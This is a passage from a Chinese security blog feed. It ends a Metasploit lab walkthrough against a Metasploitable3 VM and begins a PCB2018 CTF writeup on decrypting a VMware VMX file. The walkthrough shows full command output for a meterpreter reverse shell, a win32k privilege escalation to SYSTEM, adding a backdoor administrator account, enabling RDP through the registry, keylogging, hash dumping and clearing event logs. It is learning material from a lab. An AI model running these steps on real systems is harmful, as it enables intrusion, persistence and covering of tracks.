Testing DAV connection</span><br><span class="line">OPENSUCCEED:http://192.168.75.134:8585/uploads</span><br><span class="line"><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*</span><br><span class="line"> unless  Uploading file</span><br><span class="line">Upload succeeded: http://192.168.75.134:8585/uploads/2222.exe</span><br></pre></td></tr></table></figure></li><li><p>通过shell运行exe,执行漏洞exp,权限从SERVICE提升为SYSTEM</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background </span><br><span class="line">[*] Backgrounding session <span class="number">2.</span>..</span><br><span class="line">msf5 exploit(multi/handler) &gt; sessions -l</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                     Information                          Connection</span><br><span class="line">  --  ----  ----                     -----------                          ----------</span><br><span class="line">  <span class="number">2</span>         meterpreter php/windows  LOCAL SERVICE (<span class="number">0</span>) @ METASPLOITABLE3  <span class="number">192.168</span><span class="number">.75</span><span class="number">.128</span>:<span class="number">1111</span> -&gt; <span class="number">192.168</span><span class="number">.75</span><span class="number">.134</span>:<span class="number">54507</span> (<span class="number">192.168</span><span class="number">.75</span><span class="number">.134</span>)</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="keyword">set</span> payload <span class="comment">windows</span>/meterpreter_reverse_tcp</span><br><span class="line">payload =&gt; windows/<span class="comment">meterpreter_reverse_tcp</span></span><br><span class="line">msf5 <span class="comment">exploit(multi</span>/handler) &gt; show <span class="keyword">options</span> </span><br><span class="line"></span><br><span class="line">Module <span class="keyword">options</span> (exploit/<span class="comment">multi</span>/handler):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload <span class="keyword">options</span> (windows/<span class="comment">meterpreter_reverse_tcp):</span></span><br><span class="line"></span><br><span class="line">   Name        <span class="comment">Current Setting  Required  Description</span></span><br><span class="line">   ----        ---------------  --------  -----------</span><br><span class="line">   EXITFUNC    <span class="comment">process          yes       Exit technique (Accepted:</span> <span class="comment">''</span><span class="comment">, seh, thread, process, none)</span></span><br><span class="line">   EXTENSIONS                   <span class="comment">no        Comma-separate list of extensions to load</span></span><br><span class="line">   EXTINIT                      <span class="comment">no        Initialization strings for extensions</span></span><br><span class="line">   LHOST       <span class="comment">192.168.75.128   yes       The listen address (an interface may be specified)</span></span><br><span class="line">   LPORT       <span class="comment">1111             yes       The listen port</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit <span class="comment">target:</span></span><br><span class="line"></span><br><span class="line">   Id  <span class="comment">Name</span></span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard <span class="comment">Target</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 <span class="comment">exploit(multi</span>/handler) &gt; set lport <span class="number">2222</span></span><br><span class="line">lport =&gt; <span class="number">2222</span></span><br><span class="line">msf5 exploit(multi/<span class="comment">handler) &gt; run -j -z</span></span><br><span class="line">[*] Exploit <span class="comment">running as background job 0.</span></span><br><span class="line">[*] Exploit <span class="comment">completed, but no session was created.</span></span><br><span class="line"></span><br><span class="line">[*] Started <span class="comment">reverse TCP handler on 192.168.75.128:2222</span> </span><br><span class="line">msf5 <span class="comment">exploit(multi</span>/handler) &gt; sessions -l</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                     Information                          Connection</span><br><span class="line">  --  ----  ----                     -----------                          ----------</span><br><span class="line">  <span class="number">2</span>         meterpreter php/<span class="comment">windows  LOCAL SERVICE (0) @ METASPLOITABLE3  192.168.75.128:1111 -&gt; 192.168.75.134:54507 (192.168.75.134)</span></span><br><span class="line"></span><br><span class="line">msf5 <span class="comment">exploit(multi</span>/handler) &gt; sessions <span class="number">2</span></span><br><span class="line">[*] Starting interaction with <span class="number">2.</span>..</span><br><span class="line"></span><br><span class="line">meterpreter &gt; pwd</span><br><span class="line">C:\wamp\www\uploads</span><br><span class="line">meterpreter &gt; execute -f <span class="comment">"C:\\wamp\\www\\uploads\\2222.exe"</span></span><br><span class="line">Process <span class="number">6076</span> created.</span><br><span class="line">meterpreter &gt; [*] Meterpreter session <span class="number">3</span> opened (<span class="number">192.168</span><span class="number">.75</span><span class="number">.128</span>:<span class="number">2222</span> -&gt; <span class="number">192.168</span><span class="number">.75</span><span class="number">.134</span>:<span class="number">55448</span>) at <span class="number">2019</span><span class="number">-01</span><span class="number">-23</span> <span class="number">15</span>:<span class="number">55</span>:<span class="number">27</span> +<span class="number">0800</span></span><br><span class="line"></span><br><span class="line">meterpreter &gt; background </span><br><span class="line">[*] Backgrounding session <span class="number">2.</span>..</span><br><span class="line">msf5 exploit(multi/<span class="comment">handler) &gt; sessions -l</span></span><br><span class="line"></span><br><span class="line">Active <span class="comment">sessions</span></span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  <span class="comment">Name  Type                     Information                                   Connection</span></span><br><span class="line">  --  ----  ----                     -----------                                   ----------</span><br><span class="line">  2         meterpreter <span class="comment">php</span>/windows  LOCAL SERVICE (<span class="number">0</span>) @ METASPLOITABLE3           <span class="number">192.168</span><span class="number">.75</span><span class="number">.128</span>:<span class="number">1111</span> -&gt; <span class="number">192.168</span><span class="number">.75</span><span class="number">.134</span>:<span class="number">54507</span> (<span class="number">192.168</span><span class="number">.75</span><span class="number">.134</span>)</span><br><span class="line">  <span class="number">3</span>         meterpreter x86/<span class="comment">windows  NT AUTHORITY\LOCAL SERVICE @ METASPLOITABLE3  192.168.75.128:2222 -&gt; 192.168.75.134:55448 (192.168.75.134)</span></span><br><span class="line"></span><br><span class="line">msf5 <span class="comment">exploit(multi</span>/handler) &gt; use exploit/<span class="comment">windows</span>/local/<span class="comment">ms18_8120_win32k_privesc</span></span><br><span class="line">msf5 <span class="comment">exploit(windows</span>/local/<span class="comment">ms18_8120_win32k_privesc) &gt; show options</span> </span><br><span class="line"></span><br><span class="line">Module <span class="comment">options (exploit</span>/windows/<span class="comment">local</span>/ms18_8120_win32k_privesc):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SESSION                   <span class="keyword">yes</span>       The session to run this module on.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   <span class="number">0</span>   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/<span class="comment">local</span>/ms18_8120_win32k_privesc) &gt; set session <span class="number">3</span></span><br><span class="line">session =&gt; <span class="number">3</span></span><br><span class="line">msf5 exploit(windows/<span class="comment">local</span>/ms18_8120_win32k_privesc) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on <span class="number">192.168</span><span class="number">.75</span><span class="number">.128</span>:<span class="number">4444</span> </span><br><span class="line">[+] Exploit finished, wait <span class="keyword">for</span> privileged payload execution to complete.</span><br><span class="line">[*] Sending stage (<span class="number">179779</span> bytes) to <span class="number">192.168</span><span class="number">.75</span><span class="number">.134</span></span><br><span class="line">[*] Meterpreter session <span class="number">4</span> opened (<span class="number">192.168</span><span class="number">.75</span><span class="number">.128</span>:<span class="number">4444</span> -&gt; <span class="number">192.168</span><span class="number">.75</span><span class="number">.134</span>:<span class="number">55526</span>) at <span class="number">2019</span><span class="number">-01</span><span class="number">-23</span> <span class="number">15</span>:<span class="number">57</span>:<span class="number">19</span> +<span class="number">0800</span></span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\<span class="keyword">SYSTEM</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="远程监控"><a href="#远程监控" class="headerlink" title="远程监控"></a>远程监控</h2><ol start="16"><li>可通过run vnc实现，也可以添加用户远程登陆<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; net user</span><br><span class="line">[-] Unknown command: net.</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 5892 created.</span><br><span class="line">Channel 2 created.</span><br><span class="line">Microsoft Windows [Version 6.1.7601]</span><br><span class="line">Copyright (c) 2009 Microsoft Corporation.  All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\wamp\bin\apache\Apache2.2.21&gt;net user</span><br><span class="line">net user</span><br><span class="line"></span><br><span class="line">User accounts <span class="keyword">for</span> \\</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            anakin_skywalker         artoo_detoo              </span><br><span class="line">ben_kenobi               boba_fett                c_three_pio              </span><br><span class="line">chewbacca                darth_vader              greedo                   </span><br><span class="line">Guest                    han_solo                 jabba_hutt               </span><br><span class="line">jarjar_binks             kylo_ren                 lando_calrissian         </span><br><span class="line">leia_organa              luke_skywalker           sshd                     </span><br><span class="line">sshd_server              vagrant                  </span><br><span class="line">The command completed with one <span class="keyword">or</span> more errors.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\wamp\bin\apache\Apache2.2.21&gt;net<span class="built_in"> user </span>xiaoming 123456 /add</span><br><span class="line">net<span class="built_in"> user </span>xiaoming 123456 /add</span><br><span class="line">The command completed successfully.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\wamp\bin\apache\Apache2.2.21&gt;net localgroup administrators xiaoming /add</span><br><span class="line">net localgroup administrators xiaoming /add</span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure></li></ol><ul><li>PS:开启3389端口:REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</li></ul><ol start="17"><li>用户成功添加xiaoming<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">C:\wamp\bin\apache\Apache2.2.21&gt;net user</span><br><span class="line">net user</span><br><span class="line"></span><br><span class="line">User accounts <span class="keyword">for</span> \\</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            anakin_skywalker         artoo_detoo              </span><br><span class="line">ben_kenobi               boba_fett                c_three_pio              </span><br><span class="line">chewbacca                darth_vader              greedo                   </span><br><span class="line">Guest                    han_solo                 jabba_hutt               </span><br><span class="line">jarjar_binks             kylo_ren                 lando_calrissian         </span><br><span class="line">leia_organa              luke_skywalker           sshd                     </span><br><span class="line">sshd_server              vagrant                  xiaoming                 </span><br><span class="line">The command completed with one <span class="keyword">or</span> more errors.</span><br></pre></td></tr></table></figure></li></ol><h2 id="简单后渗透尝试"><a href="#简单后渗透尝试" class="headerlink" title="简单后渗透尝试"></a>简单后渗透尝试</h2><ol start="18"><li><p>查看是否为虚拟机</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/checkvm</span><br><span class="line"></span><br><span class="line">[<span class="meta">*</span>] Checking <span class="keyword">if</span> METASPLOITABLE3 <span class="keyword">is</span> a Virtual Machine .....</span><br><span class="line">[<span class="meta">+</span>] This <span class="keyword">is</span> a VMware Virtual Machine</span><br></pre></td></tr></table></figure></li><li><p>用户是否在线</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; quser</span><br><span class="line">[-] Unknown command: quser.</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 5828 created.</span><br><span class="line">Channel 3 created.</span><br><span class="line">Microsoft Windows [Version 6.1.7601]</span><br><span class="line">Copyright (c) 2009 Microsoft Corporation.  All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\wamp\bin\apache\Apache2.2.21&gt;quser</span><br><span class="line">quser</span><br><span class="line"> USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME</span><br><span class="line"> vagrant              <span class="built_in"> console </span>            1  Active      none   1/22/2019 6:06 PM</span><br></pre></td></tr></table></figure></li><li><p>检查闲置多久</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; idletime</span><br><span class="line">User has been idle <span class="keyword">for</span>: 6 hours 20 mins 34 secs</span><br></pre></td></tr></table></figure></li><li><p>多次截图对比管理员是否有操作</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; <span class="built_in">screenshot</span></span><br><span class="line"><span class="built_in">Screenshot</span> saved <span class="keyword">to</span>: /root/KMcxOzFn.jpeg</span><br></pre></td></tr></table></figure></li></ol><p><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/KMcxOzFn.jpeg?raw=true" alt=""></p><ol start="22"><li>获取用户hash<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20190123165519.png?raw=true" alt=""></li><li><p>键盘监控，不过没成功。。。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; keyscan_start</span><br><span class="line">Starting the keystroke<span class="built_in"> sniffer </span><span class="built_in">..</span>.</span><br><span class="line">meterpreter &gt; keyscan_dump</span><br><span class="line">Dumping captured keystrokes<span class="built_in">..</span>.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br><span class="line">meterpreter &gt; keyscan_stop</span><br><span class="line">Stopping the keystroke sniffer<span class="built_in">..</span>.</span><br></pre></td></tr></table></figure></li><li><p>还有很多骚操作日后尝试。。现在最重要就是清除痕迹(事件日志)</p></li></ol><blockquote><p>clearev</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;metasploit学习&quot;&gt;&lt;a href=&quot;#metasploit学习&quot; class=&quot;headerlink&quot; title=&quot;metasploit学习&quot;&gt;&lt;/a&gt;metasploit学习&lt;/h1&gt;&lt;h2 id=&quot;主机发现&quot;&gt;&lt;a href=&quot;#主机发现&quot; class=&quot;headerlink&quot; title=&quot;主机发现&quot;&gt;&lt;/a&gt;主机发现&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;测试靶机主要为192.168.114.29,攻击机为192.168.114.176&lt;/strong&gt;&lt;blockquote&gt;
&lt;p&gt;db_nmap -v -n -sn 192.168.114.0/24&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>PCB2018部分Writeup</title>
    <link href="https://cy9nusg4rd3n.github.io/2018/12/05/PCB2018%E9%83%A8%E5%88%86Writeup/"/>
    <id>https://cy9nusg4rd3n.github.io/2018/12/05/PCB2018部分Writeup/</id>
    <published>2018-12-05T12:06:04.000Z</published>
    <updated>2018-12-05T12:07:33.894Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="hack1t-复现队里大佬的"><a href="#hack1t-复现队里大佬的" class="headerlink" title="hack1t(复现队里大佬的)"></a>hack1t(复现队里大佬的)</h2><a id="more"></a><ol><li>题目给了完整的VM虚拟机压缩包，文件都经过了加密，但给出了密码bibinb<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205184640.png?raw=true" alt=""></li><li>用密码登陆，发现无法直接登陆系统，还需要账号密码，简单的root等弱口令失败告终；在进入系统时进入GRUB进行恢复密码，发现根本没这个选项，一下子没了什么思路，开始面向搜索引擎</li><li>一番操作后大佬找这个<br><a href="https://github.com/RF3/VMwareVMX" target="_blank" rel="noopener">破解VMX配置</a><blockquote><p>可以通过配置CD-ROM的系统来加载这个文件</p></blockquote></li><li>首先解密一下这个”Ubuntu 64-bit.vmx”,然后输入密码bibinb</li><li>发现报错<blockquote><p>Error: File Ubuntu 64-bit.vmx is not a valid VMX file</p></blockquote></li><li>原来是main.py脚本有瑕疵(果然我是做不出来的，因为遇到这个我是直接放弃的)<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205190937.png?raw=true" alt=""></li><li>把N改成n就行,然后得到<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">Password:</span><br><span class="line">guestos = <span class="string">"ubuntu-64"</span></span><br><span class="line">virtualhw<span class="selector-class">.version</span> = <span class="string">"13"</span></span><br><span class="line">config<span class="selector-class">.version</span> = <span class="string">"8"</span></span><br><span class="line">numvcpus = <span class="string">"2"</span></span><br><span class="line">cpuid<span class="selector-class">.coresPerSocket</span> = <span class="string">"1"</span></span><br><span class="line">memsize = <span class="string">"2048"</span></span><br><span class="line">pciBridge0<span class="selector-class">.present</span> = <span class="string">"TRUE"</span></span><br><span class="line">pciBridge4<span class="selector-class">.present</span> = <span class="string">"TRUE"</span></span><br><span class="line">pciBridge4<span class="selector-class">.virtualDev</span> = <span class="string">"pcieRootPort"</span></span><br><span class="line">pciBridge4<span class="selector-class">.functions</span> = <span class="string">"8"</span></span><br><span class="line">pciBridge5<span class="selector-class">.present</span> = <span class="string">"TRUE"</span></span><br><span class="line">pciBridge5<span class="selector-class">.virtualDev</span> = <span class="string">"pcieRootPort"</span></span><br><span class="line">pciBridge5<span class="selector-class">.functions</span> = <span class="string">"8"</span></span><br><span class="line">pciBridge6<span class="selector-class">.present</span> = <span class="string">"TRUE"</span></span><br><span class="line">pciBridge6<span class="selector-class">.virtualDev</span> = <span class="string">"pcieRootPort"</span></span><br><span class="line">pciBridge6<span class="selector-class">.functions</span> = <span class="string">"8"</span></span><br><span class="line">pciBridge7<span class="selector-class">.present</span> = <span class="string">"TRUE"</span></span><br><span class="line">pciBridge7<span class="selector-class">.virtualDev</span> = <span class="string">"pcieRootPort"</span></span><br><span class="line">pciBridge7<span class="selector-class">.functions</span> = <span class="string">"8"</span></span><br><span class="line">vmci0<span class="selector-class">.present</span> = <span class="string">"TRUE"</span></span><br><span class="line">mks<span class="selector-class">.enable3d</span> = <span class="string">"true"</span></span><br><span class="line">scsi0:<span class="number">0</span><span class="selector-class">.present</span> = <span class="string">"TRUE"</span></span><br><span class="line">scsi0:<span class="number">0</span><span class="selector-class">.deviceType</span> = <span class="string">"disk"</span></span><br><span class="line">scsi0:<span class="number">0</span><span class="selector-class">.fileName</span> = <span class="string">"Ubuntu 64-bit-disk1.vmdk"</span></span><br><span class="line">scsi0:<span class="number">0</span><span class="selector-class">.mode</span> = <span class="string">"persistent"</span></span><br><span class="line">scsi0<span class="selector-class">.virtualDev</span> = <span class="string">"lsilogic"</span></span><br><span class="line">scsi0<span class="selector-class">.present</span> = <span class="string">"TRUE"</span></span><br><span class="line">sata0<span class="selector-class">.present</span> = <span class="string">"TRUE"</span></span><br><span class="line">vmci0<span class="selector-class">.unrestricted</span> = <span class="string">"false"</span></span><br><span class="line">vcpu<span class="selector-class">.hotadd</span> = <span class="string">"true"</span></span><br><span class="line">mem<span class="selector-class">.hotadd</span> = <span class="string">"true"</span></span><br><span class="line">powerType<span class="selector-class">.powerOff</span> = <span class="string">"soft"</span></span><br><span class="line">powerType<span class="selector-class">.reset</span> = <span class="string">"soft"</span></span><br><span class="line">powerType<span class="selector-class">.suspend</span> = <span class="string">"soft"</span></span><br><span class="line">toolscripts<span class="selector-class">.afterpoweron</span> = <span class="string">"true"</span></span><br><span class="line">toolscripts<span class="selector-class">.afterresume</span> = <span class="string">"true"</span></span><br><span class="line">toolscripts<span class="selector-class">.beforepoweroff</span> = <span class="string">"true"</span></span><br><span class="line">toolscripts<span class="selector-class">.beforesuspend</span> = <span class="string">"true"</span></span><br><span class="line">tools<span class="selector-class">.syncTime</span> = <span class="string">"false"</span></span><br><span class="line">nvram = <span class="string">"Ubuntu 64-bit-file1.nvram"</span></span><br><span class="line">virtualHW<span class="selector-class">.productCompatibility</span> = <span class="string">"hosted"</span></span><br><span class="line">extendedConfigFile = <span class="string">"Ubuntu 64-bit.vmxf"</span></span><br><span class="line">dataFileKey = <span class="string">"type=key:cipher=AES-256:key=NHhuUIeIg1lhhNi7CvHXZysR+lrMxsNhJl7DO0SIuZ4%3d"</span></span><br><span class="line">cryptoState = <span class="string">"encrypted"</span></span><br><span class="line">isolation<span class="selector-class">.tools</span><span class="selector-class">.copy</span><span class="selector-class">.disable</span> = <span class="string">"TRUE"</span></span><br><span class="line">isolation<span class="selector-class">.tools</span><span class="selector-class">.dnd</span><span class="selector-class">.disable</span> = <span class="string">"TRUE"</span></span><br><span class="line">isolation<span class="selector-class">.tools</span><span class="selector-class">.paste</span><span class="selector-class">.disable</span> = <span class="string">"TRUE"</span></span><br><span class="line">policy<span class="selector-class">.vm</span><span class="selector-class">.mvmtid</span> = <span class="string">"52 b5 65 b9 89 e2 54 bf-e2 ee e6 99 1f 9d 2d 29"</span></span><br><span class="line">rollingTier0<span class="selector-class">.uid</span> = <span class="string">"1"</span></span><br><span class="line">rollingTier0<span class="selector-class">.interval</span> = <span class="string">"86400"</span></span><br><span class="line">rollingTier0<span class="selector-class">.maximum</span> = <span class="string">"1"</span></span><br><span class="line">rollingTier0<span class="selector-class">.clientFlags</span> = <span class="string">"8"</span></span><br><span class="line">rollingTier0<span class="selector-class">.displayName</span> = <span class="string">"自动保护快照"</span></span><br><span class="line">rollingTier1<span class="selector-class">.uid</span> = <span class="string">"2"</span></span><br><span class="line">rollingTier1<span class="selector-class">.interval</span> = <span class="string">"604800"</span></span><br><span class="line">rollingTier1<span class="selector-class">.baseTier</span> = <span class="string">"1"</span></span><br><span class="line">rollingTier1<span class="selector-class">.baseTierInterval</span> = <span class="string">"7"</span></span><br><span class="line">rollingTier1<span class="selector-class">.maximum</span> = <span class="string">"1"</span></span><br><span class="line">rollingTier1<span class="selector-class">.clientFlags</span> = <span class="string">"8"</span></span><br><span class="line">rollingTier1<span class="selector-class">.displayName</span> = <span class="string">"自动保护快照"</span></span><br><span class="line">rollingTier2<span class="selector-class">.uid</span> = <span class="string">"3"</span></span><br><span class="line">rollingTier2<span class="selector-class">.interval</span> = <span class="string">"2419200"</span></span><br><span class="line">rollingTier2<span class="selector-class">.baseTier</span> = <span class="string">"1"</span></span><br><span class="line">rollingTier2<span class="selector-class">.baseTierInterval</span> = <span class="string">"28"</span></span><br><span class="line">rollingTier2<span class="selector-class">.maximum</span> = <span class="string">"1"</span></span><br><span class="line">rollingTier2<span class="selector-class">.clientFlags</span> = <span class="string">"8"</span></span><br><span class="line">rollingTier2<span class="selector-class">.displayName</span> = <span class="string">"自动保护快照"</span></span><br><span class="line">snapshot<span class="selector-class">.numRollingTiers</span> = <span class="string">"3"</span></span><br><span class="line">floppy0<span class="selector-class">.present</span> = <span class="string">"FALSE"</span></span><br><span class="line">uuid<span class="selector-class">.bios</span> = <span class="string">"56 4d 93 ac e2 84 54 3c-79 fd be 1f 62 8c 5d 67"</span></span><br><span class="line">uuid<span class="selector-class">.location</span> = <span class="string">"56 4d 93 ac e2 84 54 3c-79 fd be 1f 62 8c 5d 67"</span></span><br><span class="line">migrate<span class="selector-class">.hostlog</span> = <span class="string">".\Ubuntu 64-bit-0dae80fb.hlog"</span></span><br><span class="line">scsi0:<span class="number">0</span><span class="selector-class">.redo</span> = <span class="string">""</span></span><br><span 